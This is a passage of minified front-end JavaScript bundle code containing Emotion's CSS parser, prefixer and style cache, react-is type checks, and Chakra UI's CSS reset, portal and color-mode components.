                                  case 115:
                                      Fh(e, S, S, r && dh(Nh(e, S, S, 0, 0, o, s, b, o, (x = []), d), w), o, w, d, s, r ? x : w);
                                      break;
                                  default:
                                      Fh(k, S, S, S, [""], w, 0, s, w);
                              }
              }
              (c = u = p = 0), (m = v = 1), (b = k = ""), (d = i);
              break;
          case 58:
              (d = 1 + ch(k)), (p = h);
          default:
              if (m < 1)
                  if (123 == y) --m;
                  else if (125 == y && 0 == m++ && 125 == ((gh = mh > 0 ? sh(vh, --mh) : 0), ph--, 10 === gh && ((ph = 1), fh--), gh)) continue;
              switch (((k += nh(y)), y * m)) {
                  case 38:
                      v = u > 0 ? 1 : ((k += "\f"), -1);
                      break;
                  case 44:
                      (s[c++] = (ch(k) - 1) * v), (v = 1);
                      break;
                  case 64:
                      45 === wh() && (k += Ph(xh())), (f = wh()), (u = d = ch((b = k += jh(Sh())))), y++;
                      break;
                  case 45:
                      45 === h && 2 == ch(k) && (m = 0);
              }
      }
  return a;
}
function Nh(e, t, n, r, o, a, i, s, l, c, u) {
  for (var d = o - 1, f = 0 === o ? a : [""], p = uh(f), h = 0, m = 0, g = 0; h < r; ++h) for (var v = 0, y = lh(e, d + 1, (d = th((m = i[h])))), b = e; v < p; ++v) (b = oh(m > 0 ? f[v] + " " + y : ah(y, /&\f/g, f[v]))) && (l[g++] = b);
  return yh(e, t, n, 0 === o ? Zp : s, l, c, u);
}
function Mh(e, t, n) {
  return yh(e, t, n, Kp, nh(gh), lh(e, 2, -2), 0);
}
function Lh(e, t, n, r) {
  return yh(e, t, n, Jp, lh(e, 0, r), lh(e, r + 1, -1), r);
}
function Bh(e, t) {
  for (var n = "", r = uh(e), o = 0; o < r; o++) n += t(e[o], o, e, t) || "";
  return n;
}
function Ih(e, t, n, r) {
  switch (e.type) {
      case "@layer":
          if (e.children.length) break;
      case "@import":
      case Jp:
          return (e.return = e.return || e.value);
      case Kp:
          return "";
      case eh:
          return (e.return = e.value + "{" + Bh(e.children, r) + "}");
      case Zp:
          e.value = e.props.join(",");
  }
  return ch((n = Bh(e.children, r))) ? (e.return = e.value + "{" + n + "}") : "";
}
var Dh = function (e) {
  var t = new WeakMap();
  return function (n) {
      if (t.has(n)) return t.get(n);
      var r = e(n);
      return t.set(n, r), r;
  };
};
function $h(e) {
  var t = Object.create(null);
  return function (n) {
      return void 0 === t[n] && (t[n] = e(n)), t[n];
  };
}
var Vh = function (e, t, n) {
      for (var r = 0, o = 0; (r = o), (o = wh()), 38 === r && 12 === o && (t[n] = 1), !Eh(o); ) xh();
      return kh(e, mh);
  },
  Uh = function (e, t) {
      return _h(
          (function (e, t) {
              var n = -1,
                  r = 44;
              do {
                  switch (Eh(r)) {
                      case 0:
                          38 === r && 12 === wh() && (t[n] = 1), (e[n] += Vh(mh - 1, t, n));
                          break;
                      case 2:
                          e[n] += Ph(r);
                          break;
                      case 4:
                          if (44 === r) {
                              (e[++n] = 58 === wh() ? "&\f" : ""), (t[n] = e[n].length);
                              break;
                          }
                      default:
                          e[n] += nh(r);
                  }
              } while ((r = xh()));
              return e;
          })(Ch(e), t)
      );
  },
  Wh = new WeakMap(),
  Hh = function (e) {
      if ("rule" === e.type && e.parent && !(e.length < 1)) {
          for (var t = e.value, n = e.parent, r = e.column === n.column && e.line === n.line; "rule" !== n.type; ) if (!(n = n.parent)) return;
          if ((1 !== e.props.length || 58 === t.charCodeAt(0) || Wh.get(n)) && !r) {
              Wh.set(e, !0);
              for (var o = [], a = Uh(t, o), i = n.props, s = 0, l = 0; s < a.length; s++) for (var c = 0; c < i.length; c++, l++) e.props[l] = o[s] ? a[s].replace(/&\f/g, i[c]) : i[c] + " " + a[s];
          }
      }
  },
  qh = function (e) {
      if ("decl" === e.type) {
          var t = e.value;
          108 === t.charCodeAt(0) && 98 === t.charCodeAt(2) && ((e.return = ""), (e.value = ""));
      }
  };
function Yh(e, t) {
  switch (
      (function (e, t) {
          return 45 ^ sh(e, 0) ? (((((((t << 2) ^ sh(e, 0)) << 2) ^ sh(e, 1)) << 2) ^ sh(e, 2)) << 2) ^ sh(e, 3) : 0;
      })(e, t)
  ) {
      case 5103:
          return Qp + "print-" + e + e;
      case 5737:
      case 4201:
      case 3177:
      case 3433:
      case 1641:
      case 4457:
      case 2921:
      case 5572:
      case 6356:
      case 5844:
      case 3191:
      case 6645:
      case 3005:
      case 6391:
      case 5879:
      case 5623:
      case 6135:
      case 4599:
      case 4855:
      case 4215:
      case 6389:
      case 5109:
      case 5365:
      case 5621:
      case 3829:
          return Qp + e + e;
      case 5349:
      case 4246:
      case 4810:
      case 6968:
      case 2756:
          return Qp + e + Gp + e + Xp + e + e;
      case 6828:
      case 4268:
          return Qp + e + Xp + e + e;
      case 6165:
          return Qp + e + Xp + "flex-" + e + e;
      case 5187:
          return Qp + e + ah(e, /(\w+).+(:[^]+)/, Qp + "box-$1$2" + Xp + "flex-$1$2") + e;
      case 5443:
          return Qp + e + Xp + "flex-item-" + ah(e, /flex-|-self/, "") + e;
      case 4675:
          return Qp + e + Xp + "flex-line-pack" + ah(e, /align-content|flex-|-self/, "") + e;
      case 5548:
          return Qp + e + Xp + ah(e, "shrink", "negative") + e;
      case 5292:
          return Qp + e + Xp + ah(e, "basis", "preferred-size") + e;
      case 6060:
          return Qp + "box-" + ah(e, "-grow", "") + Qp + e + Xp + ah(e, "grow", "positive") + e;
      case 4554:
          return Qp + ah(e, /([^-])(transform)/g, "$1" + Qp + "$2") + e;
      case 6187:
          return ah(ah(ah(e, /(zoom-|grab)/, Qp + "$1"), /(image-set)/, Qp + "$1"), e, "") + e;
      case 5495:
      case 3959:
          return ah(e, /(image-set\([^]*)/, Qp + "$1$`$1");
      case 4968:
          return ah(ah(e, /(.+:)(flex-)?(.*)/, Qp + "box-pack:$3" + Xp + "flex-pack:$3"), /s.+-b[^;]+/, "justify") + Qp + e + e;
      case 4095:
      case 3583:
      case 4068:
      case 2532:
          return ah(e, /(.+)-inline(.+)/, Qp + "$1$2") + e;
      case 8116:
      case 7059:
      case 5753:
      case 5535:
      case 5445:
      case 5701:
      case 4933:
      case 4677:
      case 5533:
      case 5789:
      case 5021:
      case 4765:
          if (ch(e) - 1 - t > 6)
              switch (sh(e, t + 1)) {
                  case 109:
                      if (45 !== sh(e, t + 4)) break;
                  case 102:
                      return ah(e, /(.+:)(.+)-([^]+)/, "$1" + Qp + "$2-$3$1" + Gp + (108 == sh(e, t + 3) ? "$3" : "$2-$3")) + e;
                  case 115:
                      return ~ih(e, "stretch") ? Yh(ah(e, "stretch", "fill-available"), t) + e : e;
              }
          break;
      case 4949:
          if (115 !== sh(e, t + 1)) break;
      case 6444:
          switch (sh(e, ch(e) - 3 - (~ih(e, "!important") && 10))) {
              case 107:
                  return ah(e, ":", ":" + Qp) + e;
              case 101:
                  return ah(e, /(.+:)([^;!]+)(;|!.+)?/, "$1" + Qp + (45 === sh(e, 14) ? "inline-" : "") + "box$3$1" + Qp + "$2$3$1" + Xp + "$2box$3") + e;
          }
          break;
      case 5936:
          switch (sh(e, t + 11)) {
              case 114:
                  return Qp + e + Xp + ah(e, /[svh]\w+-[tblr]{2}/, "tb") + e;
              case 108:
                  return Qp + e + Xp + ah(e, /[svh]\w+-[tblr]{2}/, "tb-rl") + e;
              case 45:
                  return Qp + e + Xp + ah(e, /[svh]\w+-[tblr]{2}/, "lr") + e;
          }
          return Qp + e + Xp + e + e;
  }
  return e;
}
var Xh = [
      function (e, t, n, r) {
          if (e.length > -1 && !e.return)
              switch (e.type) {
                  case Jp:
                      e.return = Yh(e.value, e.length);
                      break;
                  case eh:
                      return Bh([bh(e, { value: ah(e.value, "@", "@" + Qp) })], r);
                  case Zp:
                      if (e.length)
                          return (function (e, t) {
                              return e.map(t).join("");
                          })(e.props, function (t) {
                              switch (
                                  (function (e, t) {
                                      return (e = t.exec(e)) ? e[0] : e;
                                  })(t, /(::plac\w+|:read-\w+)/)
                              ) {
                                  case ":read-only":
                                  case ":read-write":
                                      return Bh([bh(e, { props: [ah(t, /:(read-\w+)/, ":-moz-$1")] })], r);
                                  case "::placeholder":
                                      return Bh([bh(e, { props: [ah(t, /:(plac\w+)/, ":" + Qp + "input-$1")] }), bh(e, { props: [ah(t, /:(plac\w+)/, ":-moz-$1")] }), bh(e, { props: [ah(t, /:(plac\w+)/, Xp + "input-$1")] })], r);
                              }
                              return "";
                          });
              }
      },
  ],
  Gh = function (e) {
      var t = e.key;
      if ("css" === t) {
          var n = document.querySelectorAll("style[data-emotion]:not([data-s])");
          Array.prototype.forEach.call(n, function (e) {
              -1 !== e.getAttribute("data-emotion").indexOf(" ") && (document.head.appendChild(e), e.setAttribute("data-s", ""));
          });
      }
      var r,
          o,
          a = e.stylisPlugins || Xh,
          i = {},
          s = [];
      (r = e.container || document.head),
          Array.prototype.forEach.call(document.querySelectorAll('style[data-emotion^="' + t + ' "]'), function (e) {
              for (var t = e.getAttribute("data-emotion").split(" "), n = 1; n < t.length; n++) i[t[n]] = !0;
              s.push(e);
          });
      var l,
          c,
          u,
          d,
          f = [
              Ih,
              ((d = function (e) {
                  l.insert(e);
              }),
              function (e) {
                  e.root || ((e = e.return) && d(e));
              }),
          ],
          p =
              ((c = [Hh, qh].concat(a, f)),
              (u = uh(c)),
              function (e, t, n, r) {
                  for (var o = "", a = 0; a < u; a++) o += c[a](e, t, n, r) || "";
                  return o;
              });
      o = function (e, t, n, r) {
          (l = n), Bh(Oh(e ? e + "{" + t.styles + "}" : t.styles), p), r && (h.inserted[t.name] = !0);
      };
      var h = { key: t, sheet: new Yp({ key: t, container: r, nonce: e.nonce, speedy: e.speedy, prepend: e.prepend, insertionPoint: e.insertionPoint }), nonce: e.nonce, inserted: i, registered: {}, insert: o };
      return h.sheet.hydrate(s), h;
  };
function Qh() {
  return (
      (Qh = Object.assign
          ? Object.assign.bind()
          : function (e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
                }
                return e;
            }),
      Qh.apply(this, arguments)
  );
}
var Kh = { exports: {} },
  Zh = {},
  Jh = "function" == typeof Symbol && Symbol.for,
  em = Jh ? Symbol.for("react.element") : 60103,
  tm = Jh ? Symbol.for("react.portal") : 60106,
  nm = Jh ? Symbol.for("react.fragment") : 60107,
  rm = Jh ? Symbol.for("react.strict_mode") : 60108,
  om = Jh ? Symbol.for("react.profiler") : 60114,
  am = Jh ? Symbol.for("react.provider") : 60109,
  im = Jh ? Symbol.for("react.context") : 60110,
  sm = Jh ? Symbol.for("react.async_mode") : 60111,
  lm = Jh ? Symbol.for("react.concurrent_mode") : 60111,
  cm = Jh ? Symbol.for("react.forward_ref") : 60112,
  um = Jh ? Symbol.for("react.suspense") : 60113,
  dm = Jh ? Symbol.for("react.suspense_list") : 60120,
  fm = Jh ? Symbol.for("react.memo") : 60115,
  pm = Jh ? Symbol.for("react.lazy") : 60116,
  hm = Jh ? Symbol.for("react.block") : 60121,
  mm = Jh ? Symbol.for("react.fundamental") : 60117,
  gm = Jh ? Symbol.for("react.responder") : 60118,
  vm = Jh ? Symbol.for("react.scope") : 60119;
function ym(e) {
  if ("object" == typeof e && null !== e) {
      var t = e.$$typeof;
      switch (t) {
          case em:
              switch ((e = e.type)) {
                  case sm:
                  case lm:
                  case nm:
                  case om:
                  case rm:
                  case um:
                      return e;
                  default:
                      switch ((e = e && e.$$typeof)) {
                          case im:
                          case cm:
                          case pm:
                          case fm:
                          case am:
                              return e;
                          default:
                              return t;
                      }
              }
          case tm:
              return t;
      }
  }
}
function bm(e) {
  return ym(e) === lm;
}
(Zh.AsyncMode = sm),
  (Zh.ConcurrentMode = lm),
  (Zh.ContextConsumer = im),
  (Zh.ContextProvider = am),
  (Zh.Element = em),
  (Zh.ForwardRef = cm),
  (Zh.Fragment = nm),
  (Zh.Lazy = pm),
  (Zh.Memo = fm),
  (Zh.Portal = tm),
  (Zh.Profiler = om),
  (Zh.StrictMode = rm),
  (Zh.Suspense = um),
  (Zh.isAsyncMode = function (e) {
      return bm(e) || ym(e) === sm;
  }),
  (Zh.isConcurrentMode = bm),
  (Zh.isContextConsumer = function (e) {
      return ym(e) === im;
  }),
  (Zh.isContextProvider = function (e) {
      return ym(e) === am;
  }),
  (Zh.isElement = function (e) {
      return "object" == typeof e && null !== e && e.$$typeof === em;
  }),
  (Zh.isForwardRef = function (e) {
      return ym(e) === cm;
  }),
  (Zh.isFragment = function (e) {
      return ym(e) === nm;
  }),
  (Zh.isLazy = function (e) {
      return ym(e) === pm;
  }),
  (Zh.isMemo = function (e) {
      return ym(e) === fm;
  }),
  (Zh.isPortal = function (e) {
      return ym(e) === tm;
  }),
  (Zh.isProfiler = function (e) {
      return ym(e) === om;
  }),
  (Zh.isStrictMode = function (e) {
      return ym(e) === rm;
  }),
  (Zh.isSuspense = function (e) {
      return ym(e) === um;
  }),
  (Zh.isValidElementType = function (e) {
      return (
          "string" == typeof e ||
          "function" == typeof e ||
          e === nm ||
          e === lm ||
          e === om ||
          e === rm ||
          e === um ||
          e === dm ||
          ("object" == typeof e && null !== e && (e.$$typeof === pm || e.$$typeof === fm || e.$$typeof === am || e.$$typeof === im || e.$$typeof === cm || e.$$typeof === mm || e.$$typeof === gm || e.$$typeof === vm || e.$$typeof === hm))
      );
  }),
  (Zh.typeOf = ym),
  (Kh.exports = Zh);
var xm = Kh.exports,
  wm = {};
(wm[xm.ForwardRef] = { $$typeof: !0, render: !0, defaultProps: !0, displayName: !0, propTypes: !0 }), (wm[xm.Memo] = { $$typeof: !0, compare: !0, defaultProps: !0, displayName: !0, propTypes: !0, type: !0 });
var Sm = function (e, t, n) {
      var r = e.key + "-" + t.name;
      !1 === n && void 0 === e.registered[r] && (e.registered[r] = t.styles);
  },
  km = function (e, t, n) {
      Sm(e, t, n);
      var r = e.key + "-" + t.name;
      if (void 0 === e.inserted[t.name]) {
          var o = t;
          do {
              e.insert(t === o ? "." + r : "", o, e.sheet, !0), (o = o.next);
          } while (void 0 !== o);
      }
  };
var Em = {
      animationIterationCount: 1,
      aspectRatio: 1,
      borderImageOutset: 1,
      borderImageSlice: 1,
      borderImageWidth: 1,
      boxFlex: 1,
      boxFlexGroup: 1,
      boxOrdinalGroup: 1,
      columnCount: 1,
      columns: 1,
      flex: 1,
      flexGrow: 1,
      flexPositive: 1,
      flexShrink: 1,
      flexNegative: 1,
      flexOrder: 1,
      gridRow: 1,
      gridRowEnd: 1,
      gridRowSpan: 1,
      gridRowStart: 1,
      gridColumn: 1,
      gridColumnEnd: 1,
      gridColumnSpan: 1,
      gridColumnStart: 1,
      msGridRow: 1,
      msGridRowSpan: 1,
      msGridColumn: 1,
      msGridColumnSpan: 1,
      fontWeight: 1,
      lineHeight: 1,
      opacity: 1,
      order: 1,
      orphans: 1,
      tabSize: 1,
      widows: 1,
      zIndex: 1,
      zoom: 1,
      WebkitLineClamp: 1,
      fillOpacity: 1,
      floodOpacity: 1,
      stopOpacity: 1,
      strokeDasharray: 1,
      strokeDashoffset: 1,
      strokeMiterlimit: 1,
      strokeOpacity: 1,
      strokeWidth: 1,
  },
  Cm = /[A-Z]|^ms/g,
  _m = /_EMO_([^_]+?)_([^]*?)_EMO_/g,
  Pm = function (e) {
      return 45 === e.charCodeAt(1);
  },
  Tm = function (e) {
      return null != e && "boolean" != typeof e;
  },
  Rm = $h(function (e) {
      return Pm(e) ? e : e.replace(Cm, "-$&").toLowerCase();
  }),
  zm = function (e, t) {
      switch (e) {
          case "animation":
          case "animationName":
              if ("string" == typeof t)
                  return t.replace(_m, function (e, t, n) {
                      return (jm = { name: t, styles: n, next: jm }), t;
                  });
      }
      return 1 === Em[e] || Pm(e) || "number" != typeof t || 0 === t ? t : t + "px";
  };
function Am(e, t, n) {
  if (null == n) return "";
  if (void 0 !== n.__emotion_styles) return n;
  switch (typeof n) {
      case "boolean":
          return "";
      case "object":
          if (1 === n.anim) return (jm = { name: n.name, styles: n.styles, next: jm }), n.name;
          if (void 0 !== n.styles) {
              var r = n.next;
              if (void 0 !== r) for (; void 0 !== r; ) (jm = { name: r.name, styles: r.styles, next: jm }), (r = r.next);
              return n.styles + ";";
          }
          return (function (e, t, n) {
              var r = "";
              if (Array.isArray(n)) for (var o = 0; o < n.length; o++) r += Am(e, t, n[o]) + ";";
              else
                  for (var a in n) {
                      var i = n[a];
                      if ("object" != typeof i) null != t && void 0 !== t[i] ? (r += a + "{" + t[i] + "}") : Tm(i) && (r += Rm(a) + ":" + zm(a, i) + ";");
                      else if (!Array.isArray(i) || "string" != typeof i[0] || (null != t && void 0 !== t[i[0]])) {
                          var s = Am(e, t, i);
                          switch (a) {
                              case "animation":
                              case "animationName":
                                  r += Rm(a) + ":" + s + ";";
                                  break;
                              default:
                                  r += a + "{" + s + "}";
                          }
                      } else for (var l = 0; l < i.length; l++) Tm(i[l]) && (r += Rm(a) + ":" + zm(a, i[l]) + ";");
                  }
              return r;
          })(e, t, n);
      case "function":
          if (void 0 !== e) {
              var o = jm,
                  a = n(e);
              return (jm = o), Am(e, t, a);
          }
  }
  if (null == t) return n;
  var i = t[n];
  return void 0 !== i ? i : n;
}
var jm,
  Om = /label:\s*([^\s;\n{]+)\s*(;|$)/g,
  Fm = function (e, t, n) {
      if (1 === e.length && "object" == typeof e[0] && null !== e[0] && void 0 !== e[0].styles) return e[0];
      var r = !0,
          o = "";
      jm = void 0;
      var a = e[0];
      null == a || void 0 === a.raw ? ((r = !1), (o += Am(n, t, a))) : (o += a[0]);
      for (var i = 1; i < e.length; i++) (o += Am(n, t, e[i])), r && (o += a[i]);
      Om.lastIndex = 0;
      for (var s, l = ""; null !== (s = Om.exec(o)); ) l += "-" + s[1];
      var c =
          (function (e) {
              for (var t, n = 0, r = 0, o = e.length; o >= 4; ++r, o -= 4)
                  (t = 1540483477 * (65535 & (t = (255 & e.charCodeAt(r)) | ((255 & e.charCodeAt(++r)) << 8) | ((255 & e.charCodeAt(++r)) << 16) | ((255 & e.charCodeAt(++r)) << 24))) + ((59797 * (t >>> 16)) << 16)),
                      (n = (1540483477 * (65535 & (t ^= t >>> 24)) + ((59797 * (t >>> 16)) << 16)) ^ (1540483477 * (65535 & n) + ((59797 * (n >>> 16)) << 16)));
              switch (o) {
                  case 3:
                      n ^= (255 & e.charCodeAt(r + 2)) << 16;
                  case 2:
                      n ^= (255 & e.charCodeAt(r + 1)) << 8;
                  case 1:
                      n = 1540483477 * (65535 & (n ^= 255 & e.charCodeAt(r))) + ((59797 * (n >>> 16)) << 16);
              }
              return (((n = 1540483477 * (65535 & (n ^= n >>> 13)) + ((59797 * (n >>> 16)) << 16)) ^ (n >>> 15)) >>> 0).toString(36);
          })(o) + l;
      return { name: c, styles: o, next: jm };
  },
  Nm = !!V.useInsertionEffect && V.useInsertionEffect,
  Mm =
      Nm ||
      function (e) {
          return e();
      },
  Lm = Nm || D.useLayoutEffect,
  Bm = D.createContext("undefined" != typeof HTMLElement ? Gh({ key: "css" }) : null);
Bm.Provider;
var Im = function (e) {
      return D.forwardRef(function (t, n) {
          var r = D.useContext(Bm);
          return e(t, r, n);
      });
  },
  Dm = D.createContext({}),
  $m = Dh(function (e) {
      return Dh(function (t) {
          return (function (e, t) {
              return "function" == typeof t ? t(e) : Qh({}, e, t);
          })(e, t);
      });
  }),
  Vm = function (e) {
      var t = D.useContext(Dm);
      return e.theme !== t && (t = $m(t)(e.theme)), D.createElement(Dm.Provider, { value: t }, e.children);
  },
  Um = Im(function (e, t) {
      var n = e.styles,
          r = Fm([n], void 0, D.useContext(Dm)),
          o = D.useRef();
      return (
          Lm(
              function () {
                  var e = t.key + "-global",
                      n = new t.sheet.constructor({ key: e, nonce: t.sheet.nonce, container: t.sheet.container, speedy: t.sheet.isSpeedy }),
                      a = !1,
                      i = document.querySelector('style[data-emotion="' + e + " " + r.name + '"]');
                  return (
                      t.sheet.tags.length && (n.before = t.sheet.tags[0]),
                      null !== i && ((a = !0), i.setAttribute("data-emotion", e), n.hydrate([i])),
                      (o.current = [n, a]),
                      function () {
                          n.flush();
                      }
                  );
              },
              [t]
          ),
          Lm(
              function () {
                  var e = o.current,
                      n = e[0];
                  if (e[1]) e[1] = !1;
                  else {
                      if ((void 0 !== r.next && km(t, r.next, !0), n.tags.length)) {
                          var a = n.tags[n.tags.length - 1].nextElementSibling;
                          (n.before = a), n.flush();
                      }
                      t.insert("", r, n, !1);
                  }
              },
              [t, r.name]
          ),
          null
      );
  });
function Wm() {
  for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
  return Fm(t);
}
var Hm = String.raw,
  qm = Hm`
:root,
:host {
  --chakra-vh: 100vh;
}

@supports (height: -webkit-fill-available) {
  :root,
  :host {
    --chakra-vh: -webkit-fill-available;
  }
}

@supports (height: -moz-fill-available) {
  :root,
  :host {
    --chakra-vh: -moz-fill-available;
  }
}

@supports (height: 100dvh) {
  :root,
  :host {
    --chakra-vh: 100dvh;
  }
}
`,
  Ym = () => Q.jsx(Um, { styles: qm }),
  Xm = ({ scope: e = "" }) =>
      Q.jsx(Um, {
          styles: Hm`
    html {
      line-height: 1.5;
      -webkit-text-size-adjust: 100%;
      font-family: system-ui, sans-serif;
      -webkit-font-smoothing: antialiased;
      text-rendering: optimizeLegibility;
      -moz-osx-font-smoothing: grayscale;
      touch-action: manipulation;
    }

    body {
      position: relative;
      min-height: 100%;
      margin: 0;
      font-feature-settings: "kern";
    }

    ${e} :where(*, *::before, *::after) {
      border-width: 0;
      border-style: solid;
      box-sizing: border-box;
      word-wrap: break-word;
    }

    main {
      display: block;
    }

    ${e} hr {
      border-top-width: 1px;
      box-sizing: content-box;
      height: 0;
      overflow: visible;
    }

    ${e} :where(pre, code, kbd,samp) {
      font-family: SFMono-Regular, Menlo, Monaco, Consolas, monospace;
      font-size: 1em;
    }

    ${e} a {
      background-color: transparent;
      color: inherit;
      text-decoration: inherit;
    }

    ${e} abbr[title] {
      border-bottom: none;
      text-decoration: underline;
      -webkit-text-decoration: underline dotted;
      text-decoration: underline dotted;
    }

    ${e} :where(b, strong) {
      font-weight: bold;
    }

    ${e} small {
      font-size: 80%;
    }

    ${e} :where(sub,sup) {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline;
    }

    ${e} sub {
      bottom: -0.25em;
    }

    ${e} sup {
      top: -0.5em;
    }

    ${e} img {
      border-style: none;
    }

    ${e} :where(button, input, optgroup, select, textarea) {
      font-family: inherit;
      font-size: 100%;
      line-height: 1.15;
      margin: 0;
    }

    ${e} :where(button, input) {
      overflow: visible;
    }

    ${e} :where(button, select) {
      text-transform: none;
    }

    ${e} :where(
        button::-moz-focus-inner,
        [type="button"]::-moz-focus-inner,
        [type="reset"]::-moz-focus-inner,
        [type="submit"]::-moz-focus-inner
      ) {
      border-style: none;
      padding: 0;
    }

    ${e} fieldset {
      padding: 0.35em 0.75em 0.625em;
    }

    ${e} legend {
      box-sizing: border-box;
      color: inherit;
      display: table;
      max-width: 100%;
      padding: 0;
      white-space: normal;
    }

    ${e} progress {
      vertical-align: baseline;
    }

    ${e} textarea {
      overflow: auto;
    }

    ${e} :where([type="checkbox"], [type="radio"]) {
      box-sizing: border-box;
      padding: 0;
    }

    ${e} input[type="number"]::-webkit-inner-spin-button,
    ${e} input[type="number"]::-webkit-outer-spin-button {
      -webkit-appearance: none !important;
    }

    ${e} input[type="number"] {
      -moz-appearance: textfield;
    }

    ${e} input[type="search"] {
      -webkit-appearance: textfield;
      outline-offset: -2px;
    }

    ${e} input[type="search"]::-webkit-search-decoration {
      -webkit-appearance: none !important;
    }

    ${e} ::-webkit-file-upload-button {
      -webkit-appearance: button;
      font: inherit;
    }

    ${e} details {
      display: block;
    }

    ${e} summary {
      display: list-item;
    }

    template {
      display: none;
    }

    [hidden] {
      display: none !important;
    }

    ${e} :where(
        blockquote,
        dl,
        dd,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        hr,
        figure,
        p,
        pre
      ) {
      margin: 0;
    }

    ${e} button {
      background: transparent;
      padding: 0;
    }

    ${e} fieldset {
      margin: 0;
      padding: 0;
    }

    ${e} :where(ol, ul) {
      margin: 0;
      padding: 0;
    }

    ${e} textarea {
      resize: vertical;
    }

    ${e} :where(button, [role="button"]) {
      cursor: pointer;
    }

    ${e} button::-moz-focus-inner {
      border: 0 !important;
    }

    ${e} table {
      border-collapse: collapse;
    }

    ${e} :where(h1, h2, h3, h4, h5, h6) {
      font-size: inherit;
      font-weight: inherit;
    }

    ${e} :where(button, input, optgroup, select, textarea) {
      padding: 0;
      line-height: inherit;
      color: inherit;
    }

    ${e} :where(img, svg, video, canvas, audio, iframe, embed, object) {
      display: block;
    }

    ${e} :where(img, video) {
      max-width: 100%;
      height: auto;
    }

    [data-js-focus-visible]
      :focus:not([data-focus-visible-added]):not(
        [data-focus-visible-disabled]
      ) {
      outline: none;
      box-shadow: none;
    }

    ${e} select::-ms-expand {
      display: none;
    }

    ${qm}
  `,
      });
function Gm(e = {}) {
  const { name: t, strict: n = !0, hookName: r = "useContext", providerName: o = "Provider", errorMessage: a, defaultValue: i } = e,
      s = D.createContext(i);
  return (
      (s.displayName = t),
      [
          s.Provider,
          function e() {
              var t;
              const i = D.useContext(s);
              if (!i && n) {
                  const n = new Error(null != a ? a : `${r} returned \`undefined\`. Seems you forgot to wrap component within ${o}`);
                  throw ((n.name = "ContextError"), null == (t = Error.captureStackTrace) || t.call(Error, n, e), n);
              }
              return i;
          },
          s,
      ]
  );
}
var [Qm, Km] = Gm({ strict: !1, name: "PortalManagerContext" });
function Zm(e) {
  const { children: t, zIndex: n } = e;
  return Q.jsx(Qm, { value: { zIndex: n }, children: t });
}
Zm.displayName = "PortalManager";
var Jm = Boolean(null == globalThis ? void 0 : globalThis.document) ? D.useLayoutEffect : D.useEffect,
  [eg, tg] = Gm({ strict: !1, name: "PortalContext" }),
  ng = "chakra-portal",
  rg = (e) => Q.jsx("div", { className: "chakra-portal-zIndex", style: { position: "absolute", zIndex: e.zIndex, top: 0, left: 0, right: 0 }, children: e.children }),
  og = (e) => {
      const { appendToParentPortal: t, children: n } = e,
          [r, o] = D.useState(null),
          a = D.useRef(null),
          [, i] = D.useState({});
      D.useEffect(() => i({}), []);
      const s = tg(),
          l = Km();
      Jm(() => {
          if (!r) return;
          const e = r.ownerDocument,
              n = t && null != s ? s : e.body;
          if (!n) return;
          (a.current = e.createElement("div")), (a.current.className = ng), n.appendChild(a.current), i({});
          const o = a.current;
          return () => {
              n.contains(o) && n.removeChild(o);
          };
      }, [r]);
      const c = (null == l ? void 0 : l.zIndex) ? Q.jsx(rg, { zIndex: null == l ? void 0 : l.zIndex, children: n }) : n;
      return a.current
          ? id.createPortal(Q.jsx(eg, { value: a.current, children: c }), a.current)
          : Q.jsx("span", {
                ref: (e) => {
                    e && o(e);
                },
            });
  },
  ag = (e) => {
      const { children: t, containerRef: n, appendToParentPortal: r } = e,
          o = n.current,
          a = null != o ? o : "undefined" != typeof window ? document.body : void 0,
          i = D.useMemo(() => {
              const e = null == o ? void 0 : o.ownerDocument.createElement("div");
              return e && (e.className = ng), e;
          }, [o]),
          [, s] = D.useState({});
      return (
          Jm(() => s({}), []),
          Jm(() => {
              if (i && a)
                  return (
                      a.appendChild(i),
                      () => {
                          a.removeChild(i);
                      }
                  );
          }, [i, a]),
          a && i ? id.createPortal(Q.jsx(eg, { value: r ? i : null, children: t }), i) : null
      );
  };
function ig(e) {
  const t = { appendToParentPortal: !0, ...e },
      { containerRef: n, ...r } = t;
  return n ? Q.jsx(ag, { containerRef: n, ...r }) : Q.jsx(og, { ...r });
}
(ig.className = ng), (ig.selector = ".chakra-portal"), (ig.displayName = "Portal");
var sg = D.createContext({});
function lg() {
  const e = D.useContext(sg);
  if (void 0 === e) throw new Error("useColorMode must be used within a ColorModeProvider");
  return e;
}
sg.displayName = "ColorModeContext";
var cg = { light: "chakra-ui-light", dark: "chakra-ui-dark" };
var ug,
  dg =
      ((ug = "chakra-ui-color-mode"),
      {
          ssr: !1,
          type: "localStorage",
          get(e) {
              if (!(null == globalThis ? void 0 : globalThis.document)) return e;
              let t;
              try {
                  t = localStorage.getItem(ug) || e;
              } catch (gF) {}
              return t || e;
          },
          set(e) {
              try {
                  localStorage.setItem(ug, e);
              } catch (gF) {}
          },
      }),
  fg = () => {};
function pg(e, t) {
  return "cookie" === e.type && e.ssr ? e.get(t) : t;
}
function hg(e) {
  const { value: t, children: n, options: { useSystemColorMode: r, initialColorMode: o, disableTransitionOnChange: a } = {}, colorModeManager: i = dg } = e,
      s = "dark" === o ? "dark" : "light",
      [l, c] = D.useState(() => pg(i, s)),
      [u, d] = D.useState(() => pg(i)),
      { getSystemTheme: f, setClassName: p, setDataset: h, addListener: m } = D.useMemo(
          () =>
              (function (e = {}) {
                  const { preventTransition: t = !0 } = e,
                      n = {
                          setDataset: (e) => {
                              const r = t ? n.preventTransition() : void 0;
                              (document.documentElement.dataset.theme = e), (document.documentElement.style.colorScheme = e), null == r || r();
                          },
                          setClassName(e) {
                              document.body.classList.add(e ? cg.dark : cg.light), document.body.classList.remove(e ? cg.light : cg.dark);
                          },
                          query: () => window.matchMedia("(prefers-color-scheme: dark)"),
                          getSystemTheme(e) {
                              var t;
                              return (null != (t = n.query().matches) ? t : "dark" === e) ? "dark" : "light";
                          },
                          addListener(e) {
                              const t = n.query(),
                                  r = (t) => {
                                      e(t.matches ? "dark" : "light");
                                  };
                              return (
                                  "function" == typeof t.addListener ? t.addListener(r) : t.addEventListener("change", r),
                                  () => {
                                      "function" == typeof t.removeListener ? t.removeListener(r) : t.removeEventListener("change", r);
                                  }
                              );
                          },
                          preventTransition() {
                              const e = document.createElement("style");
